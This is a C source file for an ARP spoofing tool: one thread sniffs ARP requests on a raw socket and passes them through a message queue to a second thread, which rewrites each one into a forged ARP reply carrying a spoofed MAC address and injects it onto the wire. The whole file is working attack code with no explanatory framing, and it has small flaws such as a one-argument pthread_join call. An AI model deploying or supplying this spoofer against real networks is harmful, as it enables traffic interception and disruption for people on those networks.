#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <net/if_arp.h>

char *interface;

// Raw socket creation/read/write code 

int CreateRawSocket(int protocol) {
  int rawsock;

  if ((rawsock = socket(PF_PACKET, SOCK_RAW, htons(protocol))) == -1) {
    perror("Error creating raw socket: ");
    exit(-1);
  }
  return rawsock;
}

int BindRawSocketToInterface(char *device, int rawsock, int protocol) {

  struct sockaddr_ll sll;
  struct ifreq ifr;

  bzero(&sll, sizeof(sll));
  bzero(&ifr, sizeof(ifr));

  // First Get the Interface Index  
  strncpy((char *) ifr.ifr_name, device, IFNAMSIZ);
  if ((ioctl(rawsock, SIOCGIFINDEX, &ifr)) == -1) {
    printf("Error getting Interface index !\n");
    exit(-1);
  }

  sll.sll_family = AF_PACKET;
  sll.sll_ifindex = ifr.ifr_ifindex;
  sll.sll_protocol = htons(protocol);
  
  if ((bind(rawsock, (struct sockaddr *) &sll, sizeof(sll))) == -1) {
    perror("Error binding raw socket to interface\n");
    exit(-1);
  }

  return 1;
}

int SendRawPacket(int rawsock, unsigned char *pkt, int pkt_len) {
  int sent = 0;

  // A simple write on the socket ..thats all it takes !
  if ((sent = write(rawsock, pkt, pkt_len)) != pkt_len) {
    printf("Could only send %d bytes of packet of length %d\n", sent, pkt_len);
    return 0;
  }

  return 1;
}

void PrintPacketInHex(unsigned char *packet, int len) {
  unsigned char *p = packet;
  while (len--) {
    printf("%.2x ", *p);
    p++;
  }
}

// IPC Mechanism code 
#define PATHNAME_FTOK    "/etc/services"
#define PROJ_ID_FTOK    1
#define PERMISSION    0644

typedef struct Message {
    long mtype;
    unsigned char *arp_packet; // The sniffed ARP packets memory address 
} Message;

int CreateMessageQueue(void) {
  int messageQ;
  key_t key;

  if ((key = ftok(PATHNAME_FTOK, PROJ_ID_FTOK)) == -1) {
    perror("FTOK() failed ! - exiting \n");
    exit(-1);
  }

  if ((messageQ = msgget(key, PERMISSION | IPC_CREAT)) == -1) {
    perror("msgget() failed - Exiting\n");
    exit(-1);
  }
  return messageQ;
}

SendMessage(int messageQ, Message buf) {
  if ((msgsnd(messageQ, &buf, sizeof(Message), 0)) == -1) {
    perror("Message send failed\n");
  }
}

Message *ReceiveMessage(int messageQ) {
  Message *buf = (Message *) malloc(sizeof(Message));

  if ((msgrcv(messageQ, buf, sizeof(Message), 0, 0)) == -1) {
    perror("Receive failed");
    free(buf);
    buf = NULL;
  }
  return buf;
}

DestroyMessageQueue(int messageQ) {
  if ((msgctl(messageQ, IPC_RMID, NULL)) == -1) {
    perror("Could not destroy Message Queue\n");
  }
}

// Ethernet and Arp specific headers ripped from the packet injection 
#define SPOOFED_MAC "aa:aa:aa:aa:aa:aa"

typedef struct EthernetHeader {
    unsigned char destination[6];
    unsigned char source[6];
    unsigned short protocol;

} EthernetHeader;

typedef struct ArpHeader {
    unsigned short hardware_type;
    unsigned short protocol_type;
    unsigned char hard_addr_len;
    unsigned char prot_addr_len;
    unsigned short opcode;
    unsigned char source_hardware[6];
    unsigned char source_ip[4];
    unsigned char dest_hardware[6];
    unsigned char dest_ip[4];
} ArpHeader;


// Sniffer Thread 
#define MAX_PACKETS 5

void *sniffer_thread(void *arg) {
  int raw;
  unsigned char packet_buffer[2048];
  int len;
  struct sockaddr_ll packet_info;
  int packet_info_size = sizeof(packet_info_size);
  int counter = MAX_PACKETS;
  EthernetHeader *ethernet_header;
  ArpHeader *arp_header;
  unsigned char *pkt;
  int messageQueue = *((int *) arg);
  Message buff;

  // create the raw socket 
  raw = CreateRawSocket(ETH_P_ARP);

  // Bind socket to interface 
  BindRawSocketToInterface(interface, raw, ETH_P_ARP);

  // Start Sniffing and print Hex of every packet 
  while (counter) {
    bzero(packet_buffer, 2048);

    if ((len = recvfrom(raw, packet_buffer, 2048, 0, (struct sockaddr *) &packet_info, &packet_info_size)) == -1) {
      perror("Recv from returned -1: ");
      exit(-1);
    } else {
      if (len < sizeof(EthernetHeader) + sizeof(ArpHeader)) {
        printf("Short packet\n");
        continue;
      }

      // Packet has been received successfully !! 
      // Check if it is ARP 
      ethernet_header = (EthernetHeader *) packet_buffer;

      if (ethernet_header->protocol == htons(ETH_P_ARP)) {
        // Now check if its an ARP request 
        arp_header = (ArpHeader *) (packet_buffer + sizeof(EthernetHeader));

        if (arp_header->opcode == htons(ARPOP_REQUEST)) {
          printf("SNIFFER: ARP REQ  from MAC %s IP %d.%d.%d.%d on wire\n", ether_ntoa(arp_header->source_hardware),
                 arp_header->source_ip[0], arp_header->source_ip[1], arp_header->source_ip[2],
                 arp_header->source_ip[3]);

          counter--;
          // Send the packet to the injector for modification 

          pkt = (unsigned char *) malloc(len);
          memcpy(pkt, packet_buffer, len);

          // Create the message for sending 
          buff.mtype = 1;
          buff.arp_packet = pkt;

          // Send into message queue 
          SendMessage(messageQueue, buff);

          // Print packet in hex 
          PrintPacketInHex(pkt, len);
        }
      }
    }
  }
  close(raw);
}


// Injector Thread
void *injector_thread(void *arg) {

  int raw;
  int counter = MAX_PACKETS;
  EthernetHeader *ethernet_header;
  ArpHeader *arp_header;
  unsigned char *pkt;
  int messageQueue = *((int *) arg);
  Message *buff;
  unsigned char temp[6];

  // create the raw socket 
  raw = CreateRawSocket(ETH_P_ALL);

  // Bind socket to interface 
  BindRawSocketToInterface(interface, raw, ETH_P_ALL);


  while (counter) {
    buff = ReceiveMessage(messageQueue);
    if (buff) {
      ethernet_header = (EthernetHeader *) (buff->arp_packet);
      arp_header = (ArpHeader *) (buff->arp_packet + sizeof(EthernetHeader));

      // Change the Ethernet headers 
      // Copy the source address of the packet as the destination address
      memcpy(ethernet_header->destination, ethernet_header->source, 6);

      // Copy the spoofed MAC as the source address of the packet 
      memcpy(ethernet_header->source, (void *) ether_aton(SPOOFED_MAC), 6);

      // Change the ARP headers accordingly 
      // Make it into an ARP reply
      arp_header->opcode = htons(ARPOP_REPLY);

      // Adjust the MAC addresses and IP addresses accordingly in the ARP header
      memcpy(temp, arp_header->source_hardware, 6);
      memcpy(arp_header->source_hardware, (void *) ether_aton(SPOOFED_MAC), 6);

      memcpy(arp_header->dest_hardware, temp, 6);

      memcpy(temp, arp_header->source_ip, 4);
      memcpy(arp_header->source_ip, arp_header->dest_ip, 4);

      memcpy(arp_header->dest_ip, temp, 4);

      // Send it out !! 
      if (SendRawPacket(raw, (buff->arp_packet), sizeof(EthernetHeader) + sizeof(ArpHeader))) {
        printf("INJECTOR: Replied to the request\n");
      }
      else {
        printf("INJECTOR: Unable to reply\n");
      }

      PrintPacketInHex(buff->arp_packet, sizeof(EthernetHeader) + sizeof(ArpHeader));
      free(buff->arp_packet);
      free(buff);
      counter--;
    }
  }

  close(raw);
}

main(int argc, char **argv) {
  // Assign the Interface e.g. eth0 
  interface = argv[1];

  // The Thread Ids 
  pthread_t sniffer;
  pthread_t injector;

  // The mode of communication between the threads will be IPC
  // We choose Message Queues in this example 
  int messageQueue;

  // Initialize the IPC mechanism 
  messageQueue = CreateMessageQueue();


  // Start the threads - Pass them the message queue id as argument 
  if ((pthread_create(&sniffer, NULL, sniffer_thread, &messageQueue)) != 0) {
    printf("Error creating Sniffer thread - Exiting\n");
    exit(-1);
  }

  if ((pthread_create(&injector, NULL, injector_thread, &messageQueue)) != 0) {
    printf("Error creating Injector thread - Exiting\n");
    exit(-1);
  }

  // Wait for the threads to exit 
  pthread_join(sniffer);
  pthread_join(injector);

  // Cleanup code
  DestroyMessageQueue(messageQueue);
  return 0;
}

